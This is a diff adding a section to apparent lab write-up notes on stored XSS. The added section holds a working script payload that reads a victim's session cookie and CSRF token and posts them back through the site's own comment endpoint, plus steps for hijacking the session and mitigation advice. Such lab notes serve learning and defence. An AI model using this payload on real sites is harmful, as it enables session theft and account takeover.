@@ -57,3 +57,33 @@
 **Tools:** Browser DevTools (Inspect Element) to trace the reflection point
 
 ---
+
+## Category: Exploiting XSS to steal cookies
+
+**Approach:** Posted a stored XSS payload in the blog comment that reads the victim's session cookie and CSRF token, then uses `fetch()` to POST that cookie back to the app's own `/post/comment` endpoint as a new comment — sidestepping the need for an external server.
+
+```html
+<script>
+window.addEventListener('DOMContentLoaded', function(){
+    var token = document.getElementsByName('csrf')[0].value;
+    var data = new FormData();
+    data.append('csrf', token);
+    data.append('postId', <YOUR_POST_ID>);
+    data.append('comment', document.cookie);
+    data.append('name', 'victim');
+    data.append('email', 'victim@example.com');
+    data.append('website', 'http://example.com');
+    fetch('/post/comment', { method: 'POST', mode: 'no-cors', body: data });
+});
+</script>
+```
+
+→ Sending the stolen cookie directly to an external server (via `document.location` or cross-origin `fetch()`) was unreliable — likely blocked by CSP restricting outbound `connect-src`. Looping it back through the app's own same-origin endpoint avoided this entirely.
+
+→ Waited for the simulated victim to view the comment — their cookie appeared as a new comment on the blog. Replaced own session cookie with the stolen one via DevTools to hijack the victim's session and solve the lab.
+
+**Why:** Stored XSS made `document.cookie` readable by any visitor's script → external exfiltration was likely blocked by CSP, but posting the stolen cookie back to the app's own same-origin endpoint (using the victim's valid CSRF token) worked → sanitize input to prevent the injection itself, and use `HttpOnly` cookies so even successful XSS can't read the session cookie.
+
+**Tools:** Burpsuite, browser DevTools (Cookie editing)
+
+---
